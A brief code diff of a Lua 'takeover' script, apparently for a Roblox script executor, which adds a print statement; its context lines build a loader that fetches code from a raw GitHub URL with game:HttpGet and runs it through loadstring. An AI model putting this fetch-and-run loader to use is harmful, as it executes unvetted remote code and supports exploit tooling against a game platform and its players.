@@ -2,6 +2,7 @@
 local PERSIST_URL = "https://raw.githubusercontent.com/lome4/______/main/___"
 local LOADER = "loadstring(game:HttpGet([===[" .. PERSIST_URL .. "]===], true))()"
 
+print("initating takeover script!")
 if (not _G[-9999]) then
     warn("Takeover!")
 
